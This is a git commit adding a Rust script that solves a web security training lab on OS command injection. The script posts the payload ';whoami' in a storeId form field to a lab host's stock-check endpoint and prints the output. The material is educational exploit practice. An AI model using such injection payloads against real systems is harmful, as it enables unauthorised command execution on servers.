2a11e8d56fd1558ddd1e52d5c22ec6da459cd321
Ahmed Elqalawii <elqalawii@proton.me>
2023-10-10 03:16:07 +0300

    Added 'OS command injection, simple case' lab

---
+++ OS command injection/OS command injection, simple case/src/main.rs
@@ -0,0 +1,87 @@
+/**************************************************************************************
+*
+* Author: Ahmed Elqalawy (@elqal3awii)
+*
+* Date: 10/10/2023
+*
+* Lab: OS command injection, simple case
+*
+* Steps: 1. Inject payload into "storeId" parameter to execute the `whoami` command
+*        2. Observe the `whoami` output in the response
+*
+***************************************************************************************/
+#![allow(unused)]
+/***********
+* Imports
+***********/
+use reqwest::{
+    blocking::{Client, ClientBuilder, Response},
+    header::HeaderMap,
+    redirect::Policy,
+};
+use std::{
+    collections::HashMap,
+    io::{self, Write},
+    time::Duration,
+};
+use text_colorizer::Colorize;
+
+/******************
+* Main Function
+*******************/
+fn main() {
+    // change this to your lab URL
+    let url = "https://0a08005404efe1318303338500b20072.web-security-academy.net";
+
+    // build the client that will be used for all subsequent requests
+    let client = build_client();
+
+    println!(
+        "{} {}",
+        "❯ Injection point:".blue(),
+        "storeId".yellow(),
+    );
+
+    // the payload to execute the `whoami` command
+    let payload = ";whoami";
+
+    print!(
+        "{}",
+        "❯ Injecting payload to execute the `whoami` command.. ".white(),
+    );
+    io::stdout().flush();
+
+    // fetch the page with the injected payload
+    let inject = client
+        .post(format!("{url}/product/stock"))
+        .form(&HashMap::from([("productId", "2"), ("storeId", payload)]))
+        .send()
+        .expect(&format!(
+            "{}",
+            "[!] Failed to fetch the page with the injected payload".red()
+        ));
+
+    // the response contains the output of the `whoami` command
+    let whoami = inject.text().unwrap();
+
+    print!("{} => {}", "OK".green(), whoami.yellow());
+    println!(
+        "{} {}",
+        "🗹 Check your browser, it should be marked now as"
+            .white()
+            .bold(),
+        "solved".green().bold()
+    )
+}
+
+/*******************************************************************
+* Function used to build the client
+* Return a client that will be used in all subsequent requests
+********************************************************************/
+fn build_client() -> Client {
+    ClientBuilder::new()
+        .redirect(Policy::none())
+        .connect_timeout(Duration::from_secs(5))
+        .build()
+        .unwrap()
+}
